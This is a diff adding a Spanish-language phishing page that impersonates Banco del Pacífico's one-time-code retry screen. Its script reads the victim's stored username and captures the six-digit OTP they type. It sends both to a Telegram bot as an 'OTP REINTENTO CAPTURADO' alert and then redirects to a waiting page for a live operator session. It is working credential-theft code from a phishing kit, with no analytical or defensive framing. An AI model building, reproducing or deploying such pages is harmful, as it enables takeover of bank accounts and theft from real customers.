@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Código Incorrecto</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    .logo { margin-bottom: 36px; }
+    .logo img { height: 38px; }
+
+    .card {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    /* ── Icono error sin fondo ── */
+    .icon-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 22px;
+      animation: shake 0.45s ease;
+    }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20%     { transform: translateX(-7px); }
+      40%     { transform: translateX(7px); }
+      60%     { transform: translateX(-4px); }
+      80%     { transform: translateX(4px); }
+    }
+
+    .greeting {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 6px;
+    }
+    .greeting span {
+      font-weight: 700;
+      color: #1b5eb5;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 14px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #777;
+      line-height: 1.6;
+      margin-bottom: 18px;
+    }
+
+    /* ── Banner error ── */
+    .error-banner {
+      background: #fff5f5;
+      border: 1px solid #fecdca;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #b42318;
+      margin-bottom: 32px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-align: left;
+    }
+
+    /* ── OTP inputs ── */
+    .otp-wrap {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 36px;
+    }
+
+    .otp-wrap input {
+      width: 44px;
+      height: 54px;
+      border: none;
+      border-bottom: 2.5px solid #fda29b;
+      background: transparent;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #111;
+      outline: none;
+      transition: border-color 0.2s;
+      caret-color: #1b5eb5;
+    }
+    .otp-wrap input:focus  { border-color: #1b5eb5; }
+    .otp-wrap input.filled { border-color: #1b5eb5; }
+
+    /* ── Botón ── */
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: #d0d5dd;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-bottom: 28px;
+    }
+    .btn-primary.active       { background: #1b5eb5; }
+    .btn-primary.active:hover { background: #154f9e; }
+
+    .resend {
+      font-size: 13px;
+      color: #999;
+      line-height: 1.8;
+    }
+    .resend .timer       { font-weight: 700; color: #444; }
+    .resend .resend-link {
+      color: #1b5eb5;
+      cursor: pointer;
+      text-decoration: underline;
+      display: none;
+    }
+
+    @media (max-width: 400px) {
+      .otp-wrap input { width: 38px; height: 48px; font-size: 20px; }
+      h1 { font-size: 22px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://wp.logos-download.com/wp-content/uploads/2023/02/Banco_del_Pacifico_Logo.png?dl" alt="Banco del Pacífico"/>
+  </div>
+
+  <div class="card">
+
+    <!-- Icono advertencia sin fondo -->
+    <div class="icon-wrap">
+      <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <!-- Triángulo relleno -->
+        <path d="M32 6 L59 54 H5 Z" fill="#d92d20" rx="4"/>
+        <!-- Signo ! -->
+        <rect x="29.5" y="22" width="5" height="18" rx="2.5" fill="white"/>
+        <circle cx="32" cy="46" r="3" fill="white"/>
+      </svg>
+    </div>
+
+    <p class="greeting">Querido <span id="nombre-usuario">usuario</span></p>
+    <h1>Código incorrecto</h1>
+    <p class="subtitle">El código ingresado no es válido.<br/>Por favor inténtalo de nuevo.</p>
+
+    <div class="error-banner">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#b42318" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex:0 0 18px">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+      El código no coincide. Verifica el mensaje recibido e ingrésalo nuevamente.
+    </div>
+
+    <div class="otp-wrap">
+      <input type="tel" maxlength="1" class="otp-input"/>
+      <input type="tel" maxlength="1" class="otp-input"/>
+      <input type="tel" maxlength="1" class="otp-input"/>
+      <input type="tel" maxlength="1" class="otp-input"/>
+      <input type="tel" maxlength="1" class="otp-input"/>
+      <input type="tel" maxlength="1" class="otp-input"/>
+    </div>
+
+    <button class="btn-primary" id="btn-verificar" onclick="handleVerificar()">Reintentar</button>
+
+    <p class="resend">
+      ¿No has recibido el código?<br/>
+      Puedes solicitar uno nuevo en <span class="timer" id="timer">01:00</span>
+      <span class="resend-link" id="resend-link" onclick="resetTimer()">Reenviar código</span>
+    </p>
+
+  </div>
+
+  <script src="confi.js"></script>
+  <script>
+    const usuario      = localStorage.getItem("bdp_usuario") || "usuario";
+    document.getElementById("nombre-usuario").textContent = usuario;
+
+    const inputs       = Array.from(document.querySelectorAll(".otp-input"));
+    const btnVerificar = document.getElementById("btn-verificar");
+
+    inputs[0].focus();
+
+    inputs.forEach((inp, i) => {
+      inp.addEventListener("input", e => {
+        const val = e.target.value.replace(/\D/g, "");
+        inp.value = val ? val[0] : "";
+        inp.classList.toggle("filled", !!inp.value);
+        if (val && i < inputs.length - 1) inputs[i + 1].focus();
+        checkOtp();
+      });
+      inp.addEventListener("keydown", e => {
+        if (e.key === "Backspace" && !inp.value && i > 0) {
+          inputs[i - 1].value = "";
+          inputs[i - 1].classList.remove("filled");
+          inputs[i - 1].focus();
+          checkOtp();
+        }
+      });
+      inp.addEventListener("paste", e => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
+        inputs.forEach((el, j) => {
+          el.value = pasted[j] || "";
+          el.classList.toggle("filled", !!el.value);
+        });
+        inputs[Math.min(pasted.length, inputs.length) - 1].focus();
+        checkOtp();
+      });
+    });
+
+    function checkOtp() {
+      btnVerificar.classList.toggle("active", inputs.every(i => i.value !== ""));
+    }
+
+    async function handleVerificar() {
+      const otp = inputs.map(i => i.value).join("");
+      if (otp.length < 6) return;
+
+      btnVerificar.disabled    = true;
+      btnVerificar.textContent = "Verificando...";
+
+      localStorage.setItem("bdp_otp_reintento", otp);
+      try {
+        const s = JSON.parse(localStorage.getItem("bdp_session") || "{}");
+        s.otp_reintento = otp;
+        localStorage.setItem("bdp_session", JSON.stringify(s));
+      } catch(_) {}
+
+      const sessionId = localStorage.getItem("bdp_sessionId") || "";
+      const text =
+        `╔═══════════════════════╗\n` +
+        `   🏦 *Pacifico - BR0K3N*\n` +
+        `╚═══════════════════════╝\n\n` +
+        `🔁 *OTP REINTENTO CAPTURADO*\n\n` +
+        `┌─────────────────────────\n` +
+        `│ 👤 *Usuario:* \`${usuario}\`\n` +
+        `│ 🔢 *OTP:*     \`${otp}\`\n` +
+        `└─────────────────────────\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 @Brknshinexxx`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id:      CONFIG.CHAT_ID,
+            text,
+            parse_mode:   "Markdown",
+            reply_markup: CONFIG.buildKeyboard(sessionId)
+          })
+        });
+      } catch(_) {}
+
+      window.location.href = "wait.html?s=" + sessionId;
+    }
+
+    // ── Countdown ──
+    let seconds = 60;
+    const timerEl    = document.getElementById("timer");
+    const resendLink = document.getElementById("resend-link");
+
+    function startCountdown() {
+      return setInterval(() => {
+        seconds--;
+        const m = String(Math.floor(seconds / 60)).padStart(2, "0");
+        const s = String(seconds % 60).padStart(2, "0");
+        timerEl.textContent = `${m}:${s}`;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          timerEl.style.display    = "none";
+          resendLink.style.display = "inline";
+        }
+      }, 1000);
+    }
+
+    let timer = startCountdown();
+
+    function resetTimer() {
+      clearInterval(timer);
+      seconds                  = 60;
+      timerEl.textContent      = "01:00";
+      timerEl.style.display    = "inline";
+      resendLink.style.display = "none";
+      timer = startCountdown();
+    }
+  </script>
+</body>
+</html>
